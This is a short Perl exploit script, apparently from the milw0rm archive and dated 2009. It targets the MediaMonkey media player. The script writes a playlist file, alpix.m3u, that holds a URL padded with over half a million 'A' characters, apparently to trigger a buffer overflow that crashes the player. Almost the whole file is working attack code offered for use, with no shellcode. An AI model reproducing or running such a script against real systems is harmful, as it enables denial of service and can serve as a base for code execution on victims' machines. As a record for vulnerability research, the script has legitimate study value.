#!/usr/bin/perl
# By ALpHaNiX
# NullArea.Net
# THanks
#can get the software from
http://www.download.com/MediaMonkey-Standard/3000-2141_4-10109807.html

my $file = "alpix.m3u" ;
print "[+] Exploiting....." ;
my $buff1="http://"."A" x 543339 ;
open(m3u, ">>$file") or die "Cannot open $file";
print m3u $buff1;
close(m3u);
print "\n[+] done !";

# milw0rm.com [2009-01-25]